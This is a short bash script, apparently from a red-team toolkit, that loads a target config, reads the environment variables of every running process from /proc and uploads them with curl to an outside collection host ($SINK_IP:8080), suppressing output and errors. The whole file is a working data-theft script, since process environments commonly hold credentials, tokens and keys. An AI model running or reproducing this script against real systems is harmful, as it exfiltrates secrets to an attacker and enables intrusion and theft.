#!/bin/bash
. /opt/rt/work/target.env
cat /proc/[0-9]*/environ 2>/dev/null | tr '\0' '\n' | curl -s -m 5 --data-binary @- "http://$SINK_IP:8080/env"   || true
